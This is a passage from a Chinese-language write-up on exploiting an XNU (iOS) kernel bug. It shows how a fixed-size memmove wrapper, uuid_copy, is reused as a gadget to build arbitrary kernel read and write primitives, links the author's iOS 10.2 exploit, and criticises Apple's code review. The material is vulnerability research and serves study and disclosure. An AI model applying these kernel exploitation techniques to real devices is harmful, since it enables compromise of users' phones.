然而，由于我们已经有能力从用户空间中读取和写入这个伪造对象，所以我们实际上可以将值拷贝到这个内核缓冲区中，而不必直接拷贝到用户空间。这意味着我们可以将搜索扩展到任何内存复制函数，如memcpy。当然，memcpy、memmove和bcopy都有三个参数，所以我们需要的是一个传递固定大小的封装器。

查看这些函数的交叉引用，我们发现了uuid_copy： 



```
; uuid_copy(uuid_t dst, const uuid_t src)
MOV  W2, #0x10 ; size
B    _memmove
```

这个函数只是简单的封装memmove，使其总是传递固定大小的16字节。让我们将最终的原始数据整合到序列化器小工具中：

[![](./img/86003/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01349ad0b6ea3496f4.png)

为了使把读操作变成写操作，我们只要交换参数的顺序，从任意地址拷贝到我们的伪用户客户端对象中，然后接收异常消息来读取读出数据。

您可以在iPod 6G上下载我的iOS 10.2的漏洞利用代码： https://bugs.chromium.org/p/project-zero/issues/detail?id=1004#c4

这个漏洞也是由Marco Grassi和qwertyoruiopz独立发现和利用的，检查他们的代码可以看到，他们使用了一个不同的方法来利用这个漏洞，不过也使用了mach端口。

<br>

**结语**

每个开发人员都会犯错误，并且它们是软件开发过程的一个自然部分。然而，运行XNU的1B +设备上的全新内核代码值得特别注意。在我看来，这个错误是苹果代码审查流程的明显失职，我希望漏洞和这类报道应该认真对待，并从中学到一些经验教训。
